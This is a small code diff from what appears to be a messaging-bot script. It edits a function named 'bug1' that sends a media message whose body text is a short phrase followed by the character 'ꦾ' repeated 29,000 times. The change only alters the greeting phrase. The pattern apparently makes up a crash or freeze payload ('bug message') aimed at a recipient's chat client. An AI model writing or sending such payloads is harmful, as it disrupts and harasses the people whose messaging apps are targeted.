@@ -84,7 +84,7 @@ async function bug1(message, client, participant) {
                                 hasMediaAttachment: true
                             },
                             body: {
-                                text: `⿻ᛢᛁᚱ ᚳᛜᚪᚾ love you\n${"ꦾ".repeat(29000)}\n\n`
+                                text: `⿻loft love you\n${"ꦾ".repeat(29000)}\n\n`
                             },
                             nativeFlowMessage: {
 
